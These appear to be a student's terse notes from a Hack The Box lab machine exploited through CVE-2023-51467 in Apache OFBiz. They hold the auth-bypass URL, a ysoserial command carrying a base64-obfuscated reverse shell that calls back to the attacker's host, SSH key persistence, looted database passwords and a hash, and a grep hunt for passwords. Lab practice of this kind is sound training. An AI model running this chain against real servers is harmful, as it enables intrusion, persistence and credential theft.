# ip
10.10.11.252

# cve-2023-51467

# url
https://bizness.htb/webtools/control/xmlrpc/?USERNAME=&PASSWORD=&requirePasswordChange=Y

# a modif
java -jar ysoserial-all.jar CommonsBeanutils1 "bash -c {echo,c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNDAvNDQ0NCAwPiYx}|{base64, -d}|{bash, -i}| base64 | tr -d '\n'

# connection ssh
~/.ssh/
touch ~/.ssh/authorized_keys
ssh-keygen -f mykey
chmod 600 mykey
echo "<mykey.pub>" >> ~/.ssh/authorized_keys
ssh -i mykey ofbiz@bizness.htb

# pass postgres.env
POSTGRES_PASSWORD="20wganpfDASBtBXY7GQ6"

# db credential
OFBIZ_POSTGRES_HOST=db

OFBIZ_POSTGRES_OFBIZ_DB=ofbizmaindb
OFBIZ_POSTGRES_OFBIZ_USER=ofbiz
OFBIZ_POSTGRES_OFBIZ_PASSWORD="Ab6SqDD2YM2lmEsvao-"

OFBIZ_POSTGRES_OLAP_DB=ofbizolapdb
OFBIZ_POSTGRES_OLAP_USER=ofbizolap
OFBIZ_POSTGRES_OLAP_PASSWORD="P7TFUtQHSuvha8gSxMME"

OFBIZ_POSTGRES_TENANT_DB=ofbiztenantdb
OFBIZ_POSTGRES_TENANT_USER=ofbiztenant
OFBIZ_POSTGRES_TENANT_PASSWORD="4oXET73QGriblUejjbvR"

# sha-1
{SHA}47ca69ebb4bdc9ae0adec130880165d2cc05db1a

# grep enumeration linux
grep --color=auto -rnw -iIe "PASSW\|SHA" --color=always 2>/dev/null